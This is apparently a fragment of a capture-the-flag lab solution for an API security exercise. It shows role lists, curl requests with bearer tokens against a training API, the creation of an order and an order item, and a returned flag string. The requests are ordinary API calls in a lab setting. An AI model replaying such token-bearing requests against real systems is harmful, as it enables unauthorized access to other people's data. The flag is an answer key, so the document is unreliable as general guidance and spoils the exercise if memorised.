___

```json
{
  "roles": [
    "Suppliers_Get",
    "Suppliers_GetAll",
    "SupplierCompanies_Get",
    "SupplierCompanies_GetAll"
  ]
}
```

```bash
curl -X 'GET' 'http://94.237.63.111:30334/api/v1/supplier-companies' -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjVAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJzX0dldCIsIlN1cHBsaWVyc19HZXRBbGwiLCJTdXBwbGllckNvbXBhbmllc19HZXQiLCJTdXBwbGllckNvbXBhbmllc19HZXRBbGwiXSwiZXhwIjoxNzI3NzIxOTA4LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.FL514gADfR7C43sAm1wk_WYyE4PFjcqUezYlmDaApBvEh2rel7EJ1Y-MR9IZgnH_Z1TIPZGqRza5CSYw1dI0KA' | jq
```

____

```json
{
  "roles": [
    "CustomerOrders_GetByID",
    "CustomerOrders_Create",
    "CustomerOrderItems_Get",
    "CustomerOrderItems_Create"
  ]
}
```

```bash
curl -X 'POST' 'http://94.237.63.111:30334/api/v1/customers/orders' -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyNzcyMjQ2MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.2mgvrv7bpzR6lPtJdoRTLJIpiir2FAH2e70fvE0siRr7D8JmcbK1okF1PLs-kpAhb2C1Yr8HwxBQUfRsYCNJNQ' -H 'Content-Type: application/json' -d '{ "Date": "2024-09-30" }'
```

```json
{
  "id": "5c3e3ccf-3103-490f-b6f3-23d8ec8601fe"
}
```

```bash
curl -X 'POST' 'http://94.237.63.111:30334/api/v1/customers/orders/items' -H 'accept: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyNzcyMjQ2MCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.2mgvrv7bpzR6lPtJdoRTLJIpiir2FAH2e70fvE0siRr7D8JmcbK1okF1PLs-kpAhb2C1Yr8HwxBQUfRsYCNJNQ' -H 'Content-Type: application/json' -d '{ "OrderID": "5c3e3ccf-3103-490f-b6f3-23d8ec8601fe", "OrderItems": [ { "ProductID": "3d9bd0d7-a60e-424f-b286-8f2f1bff6eda", "Quantity": 1, "NetSum": 1 } ] }'
```

```json
{
  "SuccessStatus": true,
  "Message": "HTB{4d86794f82046e465ca29d91bdbe5bca}"
}
```

